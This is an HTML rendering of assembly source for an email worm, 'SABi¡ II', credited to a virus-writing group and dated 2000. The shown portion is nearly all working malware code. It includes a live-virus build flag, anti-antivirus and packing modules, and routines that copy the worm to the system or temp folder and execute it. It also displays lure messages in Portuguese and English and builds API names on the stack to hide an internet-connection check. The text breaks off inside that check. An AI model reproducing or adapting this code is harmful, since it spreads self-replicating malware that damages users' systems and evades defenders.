<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Sabia - S2.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">   </span><span class="sc1">; Trojan/I-Worm/Palm/Wm/W32.SABi¡ II</span><span class="sc0">
   </span><span class="sc1">; </span><span class="sc0">
   </span><span class="sc1">; by: NBK &amp; Ultras / MATRiX</span><span class="sc0">
   </span><span class="sc1">; (c) 2000</span><span class="sc0">

   </span><span class="sc2">.586p</span><span class="sc0">
   </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
   </span><span class="sc9">.code</span><span class="sc0">
   </span><span class="sc5">jumps</span><span class="sc0">

   </span><span class="sc5">FIRST_VERSION_KERNEL</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0bff70000h</span><span class="sc0">

   </span><span class="sc5">DEBUG</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">   </span><span class="sc1">;  FALSE = LIVE VIRUS</span><span class="sc0">
   </span><span class="sc1">;RING_0 EQU X     ;  IFDEF, NO DEBUGGERS CAN STAY ACTIVE (W9x)</span><span class="sc0">
   </span><span class="sc5">NO_INFECT_AV</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc1">;  IFDEF, AVOID TO INFECT FILEZ WITH CERTAIN CHARS (AV CHARS)</span><span class="sc0">
   </span><span class="sc1">;NETCRYPT EQU X    ;  IFDEF, ENCRYPT ALL VIRAL CODE/DATA IN WSOCK/WS2_-32.DLL'S</span><span class="sc0">
   </span><span class="sc1">;WININIT EQU X    ;  IFDEF, CREATE WININIT.INI FILE (DEBUG FLAG INDEPENDENT)</span><span class="sc0">

   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_param.INC</span><span class="sc0">

   </span><span class="sc5">_entry</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">init_junk</span><span class="sc0">

   </span><span class="sc5">fsize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_palm.INC</span><span class="sc0">    </span><span class="sc1">;  (c)Ultras</span><span class="sc0">
   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_pack.INC</span><span class="sc0">    </span><span class="sc1">;  (c)Kamaileon/Vecna original idea</span><span class="sc0">
   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_import.INC</span><span class="sc0">
   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_anti</span><span class="sc4">-</span><span class="sc5">av.INC</span><span class="sc0"> </span><span class="sc1">;  (c)Z0MBiE</span><span class="sc0">
   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_kme32.INC</span><span class="sc0">   </span><span class="sc1">;  (c)Vecna/Z0MBiE</span><span class="sc0">
   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_base64.INC</span><span class="sc0">  </span><span class="sc1">;  (c)Vecna</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'L_INI'</span><span class="sc0">
   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_loader.INC</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'L_END'</span><span class="sc0">

   </span><span class="sc5">init_junk</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_init</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">worm@error</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_crt_v_name</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'PMT.'</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">reboot</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'LLD.'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">reboot</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutex@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00100000h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_OpenMutexA</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">call_ExitProcess</span><span class="sc0">

   </span><span class="sc1">; critical section...</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">RING_0</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debug@error</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">callring0</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">debug@error</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">debug@error</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_file_mem</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">final</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutex@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CreateMutexA</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_mutex@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">37</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'THIS IS THE CURRENT VIRUS FILE NAME:'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@005</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GlobalAlloc</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@013</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">final</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workmem</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  [fsize]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@013</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  where to compress</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@001</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  [w_handle@011]  ;  where it starts</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_ap_pack</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@014</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">final</span><span class="sc0">

   </span><span class="sc5">worm@000</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">worm@001</span><span class="sc0">
</span><span class="sc1">;   push [w_handle@011]</span><span class="sc0">
</span><span class="sc1">;   push [fsize]</span><span class="sc0">
</span><span class="sc1">;   push offset call_GetModuleHandleA</span><span class="sc0">
</span><span class="sc1">;   push offset call_GetProcAddress</span><span class="sc0">
</span><span class="sc1">;   call infect_arj               ;   (c)Vecna</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">get_crt_v_name</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetModuleHandleA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetModuleFileNameA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@005</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_lstrcpyA</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">reboot</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'PMT.'</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">reboot_x</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetUserDefaultLCID</span><span class="sc0"> </span><span class="sc1">;GetSystemDefaultLangID</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">msg_english</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">34</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Gostou da mensagem no seu email ?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">39</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Pois entao visite www.meuamigo.cjb.net'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">reboot_x</span><span class="sc0">

   </span><span class="sc5">msg_english</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">41</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Do you like this message in your email ?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'So visit www.mybestfriend.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">reboot_x</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutex@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00100000h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_OpenMutexA</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">call_ExitProcess</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetSystemDirectoryA</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">try_temp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.tmp_name</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">try_temp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_tmp_file</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">try_temp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">f_exec</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_ExitProcess</span><span class="sc0">

   </span><span class="sc5">try_temp</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetTempPathA</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">call_ExitProcess</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.tmp_name</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">call_ExitProcess</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_tmp_file</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">call_ExitProcess</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">f_exec</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_ExitProcess</span><span class="sc0">

   </span><span class="sc5">copy_tmp_file</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'LLD.'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'PMT.'</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@005</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CopyFileA</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">.tmp_name</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0f0fh</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'AAAA'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetTempFileNameA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">worm@000</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

   </span><span class="sc5">worm@001</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">worm@003</span><span class="sc0">
   </span><span class="sc1">;jmp worm@004</span><span class="sc0">
   </span><span class="sc1">;jmp worm@005</span><span class="sc0">

   </span><span class="sc1">; secao critica...</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inet@error</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_handle@010</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetSystemTime</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LLD'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'.TEN'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'INIW'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_LoadLibraryA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">inet@002</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WININET</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc1">;InternetGetConnectedState</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'tatS'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'detc'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'enno'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'CteG'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'tenr'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'etnI'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ap_InternetGetConnectedState</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">inet@002</span><span class="sc0">
